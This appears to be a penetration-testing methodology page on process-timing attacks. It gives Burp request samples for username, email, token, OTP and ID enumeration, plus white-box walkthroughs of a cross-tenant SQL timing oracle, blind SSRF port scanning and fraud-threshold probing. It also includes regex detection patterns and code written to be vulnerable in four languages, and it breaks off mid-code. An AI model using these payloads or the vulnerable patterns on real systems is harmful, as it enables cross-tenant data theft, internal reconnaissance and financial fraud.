# Process Timing

## Check List

## Methodology

### Black Box

#### Login Timing Attack – Username Enumeration

{% stepper %}
{% step %}
Identify the login endpoint and intercept a normal authentication request
{% endstep %}

{% step %}
Attempt login with an existing username and incorrect password, Capture the request in Burp Suite

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 52

{"username":"validUser","password":"WrongPass123"}
```
{% endstep %}

{% step %}
Send this request `30–50` times in Burp Repeater and Record the response times and calculate the average
{% endstep %}

{% step %}
Now attempt login with a non-existing username and the same incorrect password

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 58

{"username":"randomUser987654","password":"WrongPass123"}
```
{% endstep %}

{% step %}
Send this request `30–50` times in Burp Repeater and Record the response times and calculate the average, Compare both averages
{% endstep %}

{% step %}
If requests with a valid username consistently take longer than those with a non-existing username, the application is performing password hash verification only for existing accounts
{% endstep %}
{% endstepper %}

***

#### Password Reset Timing Attack – Email Enumeration

{% stepper %}
{% step %}
Navigate to the password reset feature
{% endstep %}

{% step %}
Submit a reset request using a valid registered email and intercept the request
{% endstep %}

{% step %}
Capture the request in Burp Suite

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 45

{"email":"validuser@target.com"}
```
{% endstep %}

{% step %}
Send this request `30–50` times in Burp Repeater
{% endstep %}

{% step %}
Record the response times and calculate the average
{% endstep %}

{% step %}
Now submit a reset request using a non-existing email address

```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 49

{"email":"random987654@target.com"}
```
{% endstep %}

{% step %}
Send this request `30–50` times in Burp Repeater and Record the response times and calculate the average, Compare both averages
{% endstep %}

{% step %}
If requests for existing emails consistently take longer than non-existing emails, the server is performing additional operations (database lookup, token generation, email dispatch)
{% endstep %}
{% endstepper %}

***

#### API Token Validation Timing Attack – Token Enumeration

{% stepper %}
{% step %}
Access an authenticated API endpoint that requires a Bearer token
{% endstep %}

{% step %}
Send a request with a structurally valid but incorrect token and intercept it Capture the request in Burp Suite

```http
GET /api/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalidsignature
```
{% endstep %}

{% step %}
Send this request `30–50` times in Burp Repeater and Record the response times and calculate the average
{% endstep %}

{% step %}
Now send a request with a completely malformed token

```http
GET /api/profile HTTP/1.1
Host: target.com
Authorization: Bearer invalidtoken123
```
{% endstep %}

{% step %}
Send this request `30–50` times, Record the response times and calculate the average and Compare both averages
{% endstep %}

{% step %}
If structurally valid tokens consistently take longer to process than malformed tokens, the backend is performing signature validation and possibly database lookups
{% endstep %}

{% step %}
If timing differences are stable and repeatable, token validation timing vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### 2FA / OTP Verification Timing Attack – Code Brute Optimization

{% stepper %}
{% step %}
Navigate to the OTP verification endpoint
{% endstep %}

{% step %}
Submit an incorrect OTP and intercept the request and Capture the request in Burp Suite

```http
POST /verify-otp HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 24

{"otp":"123456"}
```
{% endstep %}

{% step %}
Send this request `30–50` times and record average response time
{% endstep %}

{% step %}
Now slightly modify the OTP value

```http
POST /verify-otp HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 24

{"otp":"123457"}
```
{% endstep %}

{% step %}
Send `30–50` requests and measure the average and Compare response times between different incorrect OTP values&#x20;
{% endstep %}

{% step %}
If timing difference is consistent, OTP brute-force optimization via timing is confirmed
{% endstep %}
{% endstepper %}

***

#### Username Availability Check Timing Attack – AJAX Enumeration

{% stepper %}
{% step %}
Locate the username availability check endpoint
{% endstep %}

{% step %}
Intercept a request for an existing username and Capture the request in Burp Suite

```http
GET /check-username?username=admin HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send 30–50 identical requests and record the average response time
{% endstep %}

{% step %}
Now test with a random username

```http
GET /check-username?username=randomUser987654 HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send 30–50 identical requests and record the average and Compare averages
{% endstep %}

{% step %}
If existing usernames consistently take longer due to database lookup or validation logic, enumeration via timing attack is confirmed
{% endstep %}
{% endstepper %}

***

#### File / Resource ID Enumeration Timing Attack

{% stepper %}
{% step %}
Access a resource-based endpoint
{% endstep %}

{% step %}
Test with a valid resource ID without permission and Capture in Burp Suite

```http
GET /download?fileId=1024 HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send 30–50 requests and measure average time and Now test with a random non-existing ID

```http
GET /download?fileId=999999 HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send 30–50 requests and measure average time and Compare results
{% endstep %}

{% step %}
If existing resource IDs consistently take longer due to permission checks or database lookups, resource enumeration via timing attack is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Data Exfiltration via SQL Optimizer Predicate Pushdown Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multi-tenant SaaS platforms that expose dynamic query interfaces (e.g., GraphQL, OData, or advanced REST filtering grids) allowing users to search across their own datasets
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend query translation layer
{% endstep %}

{% step %}
Identify the "Application-Level Multi-Tenancy" architecture. Instead of provisioning isolated physical databases for each tenant, the enterprise utilizes a shared database architecture. To enforce data isolation, the backend application silently injects a tenant filter (e.g., `WHERE tenant_id = @current_tenant`) into every dynamic SQL query generated by the API
{% endstep %}

{% step %}
Investigate the dynamic query builder. To provide rich reporting capabilities, the API allows tenants to submit complex logical operators, regular expressions, and mathematical functions via the frontend grid (e.g., `$filter=status eq 'Active' and description contains 'Project'`)
{% endstep %}

{% step %}
Analyze the relational database execution engine. When the ORM submits the dynamically generated query to the database (e.g., PostgreSQL, SQL Server), the database's Query Optimizer determines the most efficient Execution Plan
{% endstep %}

{% step %}
Discover the fatal architectural oversight: The developer explicitly assumes that the injected `tenant_id` filter acts as an absolute execution barrier. They believe the database will _always_ filter out cross-tenant rows before evaluating the user's custom, untrusted predicates
{% endstep %}

{% step %}
Understand the Optimizer's Predicate Pushdown mechanics. Database optimizers are designed to minimize disk I/O. If the optimizer determines that evaluating the user's custom filter (e.g., a regex pattern) is computationally cheaper or has higher selectivity than scanning the `tenant_id` index, it will dynamically reorder the SQL predicates. It will evaluate the user's custom condition against _all rows in the shared table_ before applying the `tenant_id` filter
{% endstep %}

{% step %}
Formulate the Process Timing Oracle. You must construct a query containing a short-circuiting logical `AND` statement. The first part of the statement guesses a character of a target victim's secret data. The second part of the statement executes a computationally massive operation (e.g., a complex regex, a large spatial calculation, or a heavy cryptographic hash)
{% endstep %}

{% step %}
Payload structure:\
&#x20;`$filter=(secret_column LIKE 'AdminA%') AND (HEAVY_CPU_FUNCTION(description) = true)`
{% endstep %}

{% step %}
Authenticate to the application as a standard user in Tenant A
{% endstep %}

{% step %}
Submit the dynamic query payload targeting a known global record or a specific victim's row in Tenant B
{% endstep %}

{% step %}
The database optimizer receives the query: `SELECT * FROM table WHERE tenant_id = 'TenantA' AND (secret_column LIKE 'AdminA%') AND (HEAVY_CPU_FUNCTION(description) = true)`
{% endstep %}

{% step %}
The database optimizer reorders the execution plan, evaluating the attacker's predicates across the entire table. Due to logical short-circuiting, the database _only_ executes the `HEAVY_CPU_FUNCTION` if the first condition (`secret_column LIKE 'AdminA%'`) evaluates to true for that specific row
{% endstep %}

{% step %}
Measure the HTTP response time. If the query returns in 20ms, the guess was incorrect (the heavy function was short-circuited). If the query returns in 1500ms, the guess was correct (the heavy function executed). The application will ultimately return `0 records` (because the `tenant_id` filter finally applies and discards the row), but the temporal delay creates a perfect, character-by-character blind extraction oracle, completely shattering the multi-tenant isolation boundary

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Where\s*\(\s*e\s*=>\s*e\.TenantId\s*==\s*currentTenant\s*\).*Where\s*\(\s*dynamicExpression\s*\)|dynamicExpression|WhereRaw)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:createQuery\s*\(.*WHERE\s+tenantId\s*=\s*:tenantId\s+AND\s+.*userFilter|userFilter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$query->where\s*\(\s*['"]tenant_id['"]\s*,\s*\$tenantId\s*\)->whereRaw\s*\(\s*\$userFilter\s*\)|whereRaw\s*\(\s*\$userFilter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:andWhere\s*\(\s*["']tenant_id\s*=\s*:tenantId["']\s*\).*andWhere\s*\(\s*userFilter\s*\)|userFilter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\.Where\(e\s*=>\s*e\.TenantId\s*==\s*currentTenant\).*\.Where\(dynamicExpression\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
session\.createQuery\(".*WHERE\s+tenantId\s*=\s*:tenantId\s+AND\s+"\s*\+\s*userFilter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$query->where\('tenant_id',\s*\$tenantId\)->whereRaw\(\$userFilter\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
queryBuilder\.andWhere\("tenant_id\s*=\s*:tenantId"\)\.andWhere\(userFilter\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/documents")]
public async Task<IActionResult> SearchDocuments([FromQuery] string odataFilter)
{
    var tenantId = User.GetTenantId();

    // [1]
    // [2]
    var query = _dbContext.Documents.AsQueryable();

    // [3]
    // The developer injects the mandatory multi-tenant isolation filter.
    query = query.Where(d => d.TenantId == tenantId);

    // [4]
    // The developer appends the user's dynamic OData filter.
    // Entity Framework compiles this into a single SQL query. 
    // The SQL Optimizer determines the predicate execution order, NOT the C# code.
    if (!string.IsNullOrEmpty(odataFilter))
    {
        query = query.ApplyODataFilter(odataFilter);
    }

    var results = await query.ToListAsync();
    return Ok(results);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class DocumentController {

    @Autowired
    private EntityManager entityManager;

    @GetMapping("/api/v1/documents")
    public ResponseEntity<?> searchDocuments(@RequestParam String customFilter, Principal principal) {
        String tenantId = getTenantId(principal);

        // [1]
        // [2]
        // [3]
        StringBuilder sql = new StringBuilder("SELECT d FROM Document d WHERE d.tenantId = :tenantId");

        // [4]
        // The customFilter is structurally validated but appended to the WHERE clause.
        // Hibernate passes the combined query to the relational database.
        if (customFilter != null && !customFilter.isEmpty()) {
            sql.append(" AND (").append(customFilter).append(")");
        }

        Query query = entityManager.createQuery(sql.toString(), Document.class);
        query.setParameter("tenantId", tenantId);

        List<Document> results = query.getResultList();
        return ResponseEntity.ok(results);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class DocumentController extends Controller
{
    public function searchDocuments(Request $request)
    {
        $tenantId = auth()->user()->tenant_id;
        $customFilter = $request->query('filter');

        // [1]
        // [2]
        // [3]
        $query = DB::table('documents')->where('tenant_id', $tenantId);

        // [4]
        // The query builder generates: WHERE tenant_id = ? AND (<customFilter>)
        // The MySQL/PostgreSQL optimizer freely reorders these predicates.
        if ($customFilter) {
            $query->whereRaw($customFilter);
        }

        $results = $query->get();

        return response()->json($results);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/documents', async (req, res) => {
    let tenantId = req.user.tenantId;
    let customFilter = req.query.filter; // Pre-parsed AST from GraphQL or generic grid

    // [1]
    // [2]
    // [3]
    let whereClause = {
        tenant_id: tenantId
    };

    // [4]
    // TypeORM merges the tenant constraint with the user's complex conditions.
    // The underlying database engine processes the entire AST simultaneously,
    // exposing cross-tenant rows to predicate evaluation timing leaks.
    if (customFilter) {
        Object.assign(whereClause, parseCustomFilter(customFilter));
    }

    let results = await Document.findAll({ where: whereClause });

    res.json(results);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API supports dynamic data grids, allowing enterprise users to perform complex reporting and filtering operations over massive datasets, \[2] To support these operations securely, the architecture relies on Application-Level Multi-Tenancy, appending a strict `tenant_id` constraint to all `WHERE` clauses, \[3] The developer fundamentally assumes that the sequential order of operations in the application code (applying the tenant filter _before_ the user filter) dictates the execution order in the database, \[4] The execution paradox. Relational database query optimizers (like PostgreSQL or SQL Server) operate on mathematical sets, not sequential instructions. They dynamically reorder predicates based on statistical heuristics to optimize disk I/O. When the attacker injects a highly expensive computational function intertwined with a logical guess, the database evaluates the attacker's logic against _all_ rows in the table. The response timing leaks the evaluation state of the short-circuited predicate, creating a temporal extraction channel that bypasses the mandatory row-level isolation filters completely

```http
// 1. Attacker (Tenant A) targets a known global administrator's email or API key stored in the shared Users table.
// 2. Attacker crafts an OData/GraphQL filter utilizing a short-circuit AND statement and a heavy regex function.

// Guessing the first character is 'a'
GET /api/v1/users?filter=(email LIKE 'a%') AND (user_agent ~ '^.*(a+)+.*$') HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_a_token>

// 3. The API Gateway forwards the request. The database optimizer executes the query.
// 4. If the target admin's email does NOT start with 'a', the first predicate is FALSE.
//    The database short-circuits and skips the heavy regex.
//    The query returns 0 records in 25ms.

// 5. Attacker guesses the next character ('b').
GET /api/v1/users?filter=(email LIKE 'b%') AND (user_agent ~ '^.*(a+)+.*$') HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_a_token>

// 6. If the target admin's email DOES start with 'b', the first predicate is TRUE.
// 7. The database is forced to evaluate the catastrophic backtracking regex against the row.
// 8. The CPU spins. The query ultimately returns 0 records (due to the tenant_id filter), 
//    but the response takes 1,800ms.

// 9. The attacker registers the 1,800ms delay as a TRUE boolean signal. 
// 10. The attacker repeats the process, automating the extraction of the entire string character by character.
```
{% endstep %}

{% step %}
To provide flexible, self-serve reporting capabilities within a shared-database multi-tenant environment, software architects exposed dynamic query parameters while relying on application-injected tenant constraints to ensure data isolation. The architectural flaw emerged from a profound misunderstanding of relational database optimization mechanics. Developers assumed that `WHERE` clause predicates were evaluated linearly, believing the tenant constraint acted as an impermeable firewall. However, database query optimizers fluidly reorder predicates to minimize disk access. By supplying a complex filter combining a targeted string guess with a computationally devastating regular expression, the attacker forced the database engine to evaluate their logic against cross-tenant rows _prior_ to applying the isolation constraint. The resulting timing discrepancy, caused by the database short-circuiting the heavy function upon a false guess, created a high-fidelity Process Timing Oracle, allowing the attacker to blindly exfiltrate highly classified cross-tenant data
{% endstep %}
{% endstepper %}

***

#### Blind Internal Network Mapping via Asynchronous Connection Timeout Disparity

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on features that initiate outbound HTTP requests on behalf of the user, such as Webhook configurations, "Import from URL" features, or OpenGraph link unfurling services
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Server-Side Request Forgery (SSRF) mitigation architecture. To protect the internal network (e.g., AWS Metadata endpoints, internal Kubernetes services), developers implement strict application-layer DNS resolution filters
{% endstep %}

{% step %}
Investigate the fallback logic. If a user supplies a URL that bypasses the DNS filter (e.g., using DNS rebinding or an obscure IP encoding), the request proceeds to the internal HTTP client
{% endstep %}

{% step %}
Analyze the HTTP Client configuration. To prevent the API from hanging indefinitely if a user supplies a dead or unresponsive IP address, the developer sets a rigid timeout on the HTTP client (e.g., `Timeout = TimeSpan.FromMilliseconds(500)`)
{% endstep %}

{% step %}
Discover the Error Masking optimization: To prevent attackers from differentiating between valid and invalid internal responses, the developer implements a global `catch` block. Whether the request succeeds, fails, timeouts, or hits a closed port, the API uniformly returns a generic `{"status": "Failed to fetch resource"}`
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that by returning identical HTTP response bodies and HTTP status codes, the attacker is entirely blinded, rendering any underlying SSRF attempt useless for network reconnaissance
{% endstep %}

{% step %}
Recognize the Transport Layer Process Timing vulnerability: The underlying Operating System's TCP/IP stack reacts to different network topologies at vastly different speeds. These temporal variations propagate through the application's execution thread, bypassing the generic error response mask
{% endstep %}

{% step %}
Formulate the TCP State Oracle payload. You will probe internal IP addresses and ports to map the internal microservice mesh (e.g., sweeping `10.0.0.1` to `10.0.0.255` on port `8080`)
{% endstep %}

{% step %}
Formulate the TCP State Oracle payload. You will probe internal IP addresses and ports to map the internal microservice mesh (e.g., sweeping `10.0.0.1` to `10.0.0.255` on port `8080`)
{% endstep %}

{% step %}
The HTTP client initiates the SYN packet. Because the IP does not exist, the network drops the packet. The OS waits for a SYN-ACK. It receives nothing. The HTTP client hits the application-layer timeout threshold exactly. The API returns the generic error in \~500ms
{% endstep %}

{% step %}
Submit a request targeting an active internal IP address, but a closed port (e.g., targeting the database server on port 80)
{% endstep %}

{% step %}
The HTTP client initiates the SYN packet. The internal database server immediately rejects the connection with a TCP `RST` (Reset) packet. The HTTP client immediately throws a `ConnectionRefusedException`. The API catches it and returns the generic error in \~5ms
{% endstep %}

{% step %}
Submit a request targeting an active internal IP address and an open port running an internal microservice
{% endstep %}

{% step %}
The HTTP client connects instantly. The internal service processes the request and returns an HTTP 404 or 401. The API receives the response, rejects it, and returns the generic error in \~45ms
{% endstep %}

{% step %}
By statistically analyzing the process timing of the generic error responses (500ms = Dropped/Firewalled, 5ms = Closed Port/Active Host, 45ms = Open Port/Active Service), you create a high-speed, invisible port scanner capable of mapping the entire internal Kubernetes cluster and identifying high-value internal targets, entirely circumventing the application's strict error-masking protocols

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:new\s+HttpClient.*Timeout\s*=\s*TimeSpan\.FromMilliseconds\s*\(|Timeout\s*=\s*TimeSpan\.FromMilliseconds)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:setConnectTimeout\s*\(\s*Duration\.ofMillis\s*\(|setReadTimeout\s*\(|connectTimeout)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:['"]timeout['"]\s*=>\s*0\.[0-9]+|timeout\s*=>)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:axios\.get\s*\([^)]*timeout\s*:\s*[0-9]+\s*\}|timeout\s*:\s*[0-9]+)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
new\s+HttpClient.*Timeout\s*=\s*TimeSpan\.FromMilliseconds\(
```
{% endtab %}

{% tab title="Java" %}
```regexp
\.setConnectTimeout\(Duration\.ofMillis\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\['timeout'\s*=>\s*0\.[0-9]+\]
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
axios\.get\(.*timeout:\s*[0-9]+\s*\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class WebhookValidationService
{
    private readonly HttpClient _internalClient;

    public WebhookValidationService()
    {
        // [1]
        // [2]
        // Strict 500ms timeout to prevent worker thread exhaustion
        var handler = new HttpClientHandler { AllowAutoRedirect = false };
        _internalClient = new HttpClient(handler) 
        { 
            Timeout = TimeSpan.FromMilliseconds(500) 
        };
    }

    [HttpPost("/api/v1/webhooks/test")]
    public async Task<IActionResult> TestWebhook([FromBody] WebhookRequest request)
    {
        try
        {
            // Application-layer DNS check omitted for brevity
            
            // [3]
            var response = await _internalClient.GetAsync(request.TargetUrl);
            
            if (response.IsSuccessStatusCode)
            {
                return Ok(new { Status = "Webhook Verified" });
            }
        }
        catch (Exception)
        {
            // [4]
            // Catches ALL exceptions (TimeoutException, HttpRequestException, SocketException)
            // The developer masks the error to prevent internal infrastructure leakage.
        }

        // Generic fallback error masks the actual failure reason
        return BadRequest(new { Status = "Failed to fetch resource from the provided URL." });
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class WebhookValidationService {

    private final RestTemplate restTemplate;

    public WebhookValidationService(RestTemplateBuilder builder) {
        // [1]
        // [2]
        this.restTemplate = builder
                .setConnectTimeout(Duration.ofMillis(500))
                .setReadTimeout(Duration.ofMillis(500))
                .build();
    }

    public ResponseEntity<?> testWebhook(String targetUrl) {
        try {
            // [3]
            ResponseEntity<String> response = restTemplate.getForEntity(targetUrl, String.class);
            
            if (response.getStatusCode().is2xxSuccessful()) {
                return ResponseEntity.ok(Map.of("status", "Webhook Verified"));
            }
        } catch (Exception e) {
            // [4]
            // Swallows ResourceAccessException, HttpStatusCodeException, etc.
        }

        return ResponseEntity.badRequest().body(Map.of("status", "Failed to fetch resource from the provided URL."));
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class WebhookValidationService extends Controller
{
    public function testWebhook(Request $request)
    {
        $targetUrl = $request->input('targetUrl');

        try {
            // [1]
            // [2]
            $response = Http::timeout(0.5)->get($targetUrl);

            // [3]
            if ($response->successful()) {
                return response()->json(['status' => 'Webhook Verified']);
            }
        } catch (\Exception $e) {
            // [4]
            // Catch-all masks connection timeouts and refused connections
        }

        return response()->json(['status' => 'Failed to fetch resource from the provided URL.'], 400);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const axios = require('axios');

class WebhookValidationService {
    static async testWebhook(req, res) {
        let targetUrl = req.body.targetUrl;

        try {
            // [1]
            // [2]
            // 500ms timeout enforced to prevent application hang
            let response = await axios.get(targetUrl, { timeout: 500, maxRedirects: 0 });

            if (response.status === 200) {
                return res.json({ status: "Webhook Verified" });
            }
        } catch (err) {
            // [3]
            // [4]
            // Masks the specific Axios error (e.g., ECONNREFUSED vs ETIMEDOUT)
            // The response payload is intentionally identical for all failure modes.
        }

        return res.status(400).json({ status: "Failed to fetch resource from the provided URL." });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes user-provided URLs asynchronously or synchronously. To protect the application's thread pool from exhaustion, the developer heavily restricts connection lifespans, \[2] The HTTP client enforces a strict `500ms` connection and read timeout, \[3] The architecture attempts to prevent Server-Side Request Forgery (SSRF) information disclosure by implementing a generic error-masking policy, \[4] The execution paradox. The developer equates data sanitization (stripping the exception message) with process obfuscation. They fail to realize that the underlying Operating System's TCP stack resolves connections at wildly varying speeds based on physical network topology. An unresponsive IP forces the application thread to sleep for exactly 500ms before returning the masked error. A closed port actively rejects the connection, waking the thread and returning the masked error in 5ms. This massive timing disparity creates a pristine, low-noise oracle, allowing the attacker to map the internal service mesh entirely out-of-band

```http
// 1. Attacker controls a script to measure HTTP response times with high precision.
// 2. Attacker probes an unallocated internal IP address to establish the baseline timeout.
POST /api/v1/webhooks/test HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{"targetUrl": "http://10.0.1.254:80"}

// Response Time: 504ms. Result: Generic Error. (Conclusion: IP does not exist or is firewalled).

// 3. Attacker sweeps the subnet, probing a suspected database server on port 80.
POST /api/v1/webhooks/test HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{"targetUrl": "http://10.0.1.50:80"}

// Response Time: 8ms. Result: Generic Error. (Conclusion: Host 10.0.1.50 is ALIVE, but port 80 is CLOSED).

// 4. Attacker targets the live host on a known microservice port (8080).
POST /api/v1/webhooks/test HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

{"targetUrl": "http://10.0.1.50:8080"}

// Response Time: 42ms. Result: Generic Error. (Conclusion: Host is ALIVE, port 8080 is OPEN. Internal microservice discovered).
```
{% endstep %}

{% step %}
To safely interact with untrusted external resources and mitigate Server-Side Request Forgery (SSRF) reconnaissance, architects implemented rigid application-layer connection timeouts combined with generic error masking. The security posture relied on the assumption that identical HTTP response bodies mathematically blinded the attacker to the underlying network state. This optimization entirely ignored the determinism of the Operating System's transport layer. While the application successfully scrubbed the payload data, it could not obfuscate the thread execution time dictated by the TCP/IP stack. An active rejection (`TCP RST`) caused the execution thread to return almost instantly, whereas a dropped packet caused the thread to block until the strict timeout limit was reached. The attacker utilized this Process Timing disparity to convert an outwardly secure, blind SSRF endpoint into a high-speed, highly accurate internal port scanner, seamlessly mapping the protected microservice ecosystem
{% endstep %}
{% endstepper %}

***

#### Authorization Perimeter Bypass via Synchronous Rule-Engine Threshold Degradation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on critical transactional endpoints that evaluate complex risk, compliance, or fraud policies (e.g., Financial Wire Transfers, User Role Promotions, Automated Loan Approvals)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Multi-Tiered Rule Engine" architecture. Evaluating every single transaction against a heavy, third-party synchronous API (e.g., LexisNexis, Experian, or a heavyweight internal Machine Learning model) causes unacceptable latency and massive vendor API costs
{% endstep %}

{% step %}
Investigate the routing optimization. To minimize latency and cost, developers implement a fast-path/slow-path gating mechanism. The transaction is first evaluated against a lightweight, in-memory Rule Engine (e.g., checking if the transaction `amount < 5000`, the IP is known, and the account age `> 30 days`)
{% endstep %}

{% step %}
Analyze the temporal threshold logic. If the transaction passes the fast-path rules (indicating low risk), the system synchronously approves the transaction. If the transaction violates _any_ of the fast-path rules (indicating high risk), the thread synchronously blocks and makes an HTTP call to the heavy, external anti-fraud API for a comprehensive deep-scanDiscover the architectural assumption: The enterprise considers the internal fast-path rules (the exact dollar amounts, velocity limits, and risk thresholds) to be highly classified intellectual property. The developer assumes that because the API returns an identical `{"status": "Approved"}` response regardless of whether it took the fast-path or the slow-path, the attacker cannot reverse-engineer the internal risk thresholds
{% endstep %}

{% step %}
Understand the Process Timing exposure: The fast-path in-memory evaluation takes \~15ms. The slow-path external API validation takes \~1200ms. This immense timing disparity provides a direct, unmaskable window into the exact boundaries of the enterprise's proprietary risk models
{% endstep %}

{% step %}
Formulate the Business Logic Oracle payload. You want to execute a massive fraudulent transaction, but you know the external anti-fraud API will catch you. Therefore, you must construct a payload that stays entirely within the fast-path
{% endstep %}

{% step %}
Systematically probe the transactional endpoint, manipulating one variable at a time (e.g., adjusting the transfer amount: `$1000`, `$2000`, `$3000`)
{% endstep %}

{% step %}
Submit the requests and monitor the response times
{% endstep %}

{% step %}
Request for `$2000` returns in 18ms. (Fast-path)
{% endstep %}

{% step %}
Request for `$3000` returns in 1250ms. (Slow-path, external API engaged)
{% endstep %}

{% step %}
Use a binary search algorithm to narrow the threshold. Request `$2500` -> 18ms. Request `$2600` -> 1245ms. Threshold mapped: `$2500`
{% endstep %}

{% step %}
Having perfectly mapped the invisible fast-path thresholds using Process Timing, construct an automated script that rapidly executes hundreds of fraudulent transactions floating exactly 1 byte/dollar below the threshold (e.g., transferring `$2500` repeatedly). Every transaction effortlessly traverses the fast-path, silently bypassing the heavy external compliance checks, resulting in catastrophic business logic subversion

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:if\s*\(\s*transaction\.Amount\s*>\s*Thresholds\.RequiresDeepScan\s*\).*ExternalFraudApi|riskScore|RequiresDeepScan)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:if\s*\(\s*riskScore\s*>=\s*[0-9]+\s*\).*restTemplate\.postForEntity|riskScore\s*>=)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:if\s*\(\s*\$riskScore\s*>\s*config\s*\(\s*['"]risk\.threshold['"]\s*\)\s*\).*Http::post|risk\.threshold)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:requiresManualReview\s*\(\s*req\.body\s*\).*mlModel\.evaluate|riskScore|manualReview)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
if\s*\(transaction\.Amount\s*>\s*Thresholds\.RequiresDeepScan\)\s*\{\s*await\s+ExternalFraudApi
```
{% endtab %}

{% tab title="Java" %}
```regexp
if\s*\(riskScore\s*>=\s*50\)\s*\{\s*restTemplate\.postForEntity
```
{% endtab %}

{% tab title="PHP" %}
```regexp
if\s*\(\$riskScore\s*>\s*config\('risk\.threshold'\)\)\s*\{\s*Http::post
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
if\s*\(requiresManualReview\(req\.body\)\)\s*\{\s*await\s+mlModel\.evaluate
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TransactionApprovalService
{
    private readonly IExternalFraudService _externalFraudApi;

    public async Task<IActionResult> ProcessTransferAsync(WireTransferRequest request)
    {
        // [1]
        // [2]
        // Fast-path memory evaluation
        bool requiresDeepScan = false;

        if (request.Amount > 2500) requiresDeepScan = true;
        if (request.DestinationAccount.IsNew) requiresDeepScan = true;

        // [3]
        // [4]
        if (requiresDeepScan)
        {
            // Blocks the execution thread calling out to a third-party vendor
            var deepScanResult = await _externalFraudApi.EvaluateRiskAsync(request); // Takes ~1500ms
            if (!deepScanResult.IsSafe) return Forbid("Transaction Rejected");
        }

        await CompleteTransferAsync(request);

        // Identical response masks the execution path
        return Ok(new { Status = "Approved" });
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class TransactionApprovalService {

    @Autowired
    private ExternalFraudApiClient fraudApiClient;

    @Transactional
    public ResponseEntity<?> processWireTransfer(WireTransferRequest request, Principal principal) {
        
        // [1]
        // [2]
        // High-speed, in-memory rule engine evaluation
        int riskScore = 0;
        if (request.getAmount() > 5000) riskScore += 50;
        if (request.isInternational()) riskScore += 30;

        // [3]
        // [4]
        // Temporal Gateway: If risk is high, block synchronously to call the heavy API.
        if (riskScore >= 50) {
            boolean isFraudulent = fraudApiClient.performDeepScan(request); // Takes ~1200ms
            if (isFraudulent) {
                return ResponseEntity.status(403).body(Map.of("status", "Rejected"));
            }
        }

